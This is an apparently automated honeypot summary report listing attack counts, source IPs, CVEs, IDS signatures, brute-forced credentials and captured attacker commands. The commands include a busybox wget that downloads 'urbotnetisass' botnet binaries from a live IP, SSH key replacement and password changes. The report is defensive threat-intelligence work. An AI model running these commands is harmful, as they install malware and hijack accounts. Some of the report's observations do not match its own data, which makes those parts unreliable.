Honeypot Attack Summary Report
Report Generated: 2025-10-01T00:01:18Z
Timeframe: 2025-09-30T23:20:01Z to 2025-10-01T00:00:01Z
Log Files: agg_log_20250930T232001Z.json, agg_log_20250930T234001Z.json, agg_log_20251001T000001Z.json

Executive Summary
This report summarizes honeypot activity over a 40-minute period, analyzing data from three log files. A total of 11,181 events were recorded across various honeypots. The most targeted services were SSH (Cowrie) and various TCP/UDP ports (Honeytrap and Suricata). A significant amount of activity originated from IP address 117.72.52.28, primarily targeting the Cowrie honeypot. Multiple CVEs were detected, and a variety of commands were attempted by attackers, many of which involved downloading and executing malicious scripts.

Detailed Analysis

Attacks by Honeypot
* Cowrie: 4785
* Honeytrap: 2527
* Suricata: 1999
* Ciscoasa: 1410
* Mailoney: 254
* Redishoneypot: 28
* ConPot: 40
* H0neytr4p: 31
* Tanner: 31
* Adbhoney: 18
* Dionaea: 27
* Sentrypeer: 15
* Ipphoney: 1
* Heralding: 3
* Honeyaml: 9
* Dicompot: 3

Top Attacking IPs
* 117.72.52.28: 1250
* 88.214.50.58: 844
* 92.242.166.161: 237
* 103.100.211.182: 217
* 185.226.0.52: 212
* 194.48.96.40: 203
* 63.250.40.73: 153
* 8.210.28.94: 405
* 92.63.197.55: 353
* 196.251.72.53: 350
* 185.156.73.167: 366
* 185.156.73.166: 363
* 196.251.80.30: 345
* 92.63.197.59: 330
* 110.159.172.76: 244
* 103.153.190.105: 109
* 3.134.148.59: 105

Top Targeted Ports/Protocols
* 22: 793
* 25: 248
* 8333: 100
* 443: 37
* 80: 31
* 23: 19
* TCP/22: 30
* UDP/161: 32
* 6379: 22
* 5977: 54
* 9042: 53

Most Common CVEs
* CVE-2002-0013 CVE-2002-0012: 18
* CVE-2002-0013 CVE-2002-0012 CVE-1999-0517: 15
* CVE-2021-3449 CVE-2021-3449: 4
* CVE-2019-11500 CVE-2019-11500: 3
* CVE-2024-3721 CVE-2024-3721: 2
* CVE-2016-20016 CVE-2016-20016: 1

Commands Attempted by Attackers
* uname -a
* cd ~; chattr -ia .ssh; lockr -ia .ssh
* lockr -ia .ssh
* cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa ..."
* cat /proc/cpuinfo | grep name | wc -l
* uname -s -m
* cd /data/local/tmp/; rm *; busybox wget http://94.154.35.154/arm.urbotnetisass; ...
* echo -e ... | passwd | bash
* free -m | grep Mem | awk ...
* crontab -l
* w
* uname -m
* top
* whoami

Signatures Triggered
* ET DROP Dshield Block Listed Source group 1
* 2402000
* ET SCAN NMAP -sS window 1024
* 2009582
* ET SCAN MS Terminal Server Traffic on Non-standard Port
* 2023753
* ET HUNTING RDP Authentication Bypass Attempt
* 2034857
* ET INFO Reserved Internal IP Traffic
* 2002752
* ET DROP Spamhaus DROP Listed Traffic Inbound group 32
* 2400031

Users / Login Attempts
* root/adminHW
* root/Pass2024
* root/nPSpP4PBW0
* hacluster/hacluster
* rick/rick123
* 345gs5662d34/345gs5662d34
* root/3245gs5662d34
* root/2glehe5t24th1issZs
* test/zhbjETuyMffoL8F

Files Uploaded/Downloaded
* arm.urbotnetisass
* arm5.urbotnetisass
* arm6.urbotnetisass
* arm7.urbotnetisass
* x86_32.urbotnetisass
* mips.urbotnetisass
* mipsel.urbotnetisass
* soap-envelope
* addressing
* discovery
* fonts.gstatic.com
* css?family=Libre+Franklin...

HTTP User-Agents
* No HTTP user agents were recorded in this period.

SSH Clients and Servers
* No specific SSH clients or servers were recorded in this period.

Top Attacker AS Organizations
* No attacker AS organizations were recorded in this period.

Key Observations and Anomalies
* A large number of commands were executed by a single IP address, 94.154.35.154, attempting to download and execute multiple malicious files.
* A significant number of login attempts were made with the username 'root' and various passwords.
* The most common attack vector appears to be brute-force SSH attacks, as indicated by the high number of events on port 22 and the variety of login credentials attempted.
* The commands attempted suggest that attackers are interested in compromising IoT devices, given the variety of architectures targeted by the downloaded scripts.
* The presence of Suricata alerts for RDP and MS Terminal Server traffic on non-standard ports indicates that attackers are also scanning for exposed remote desktop services.
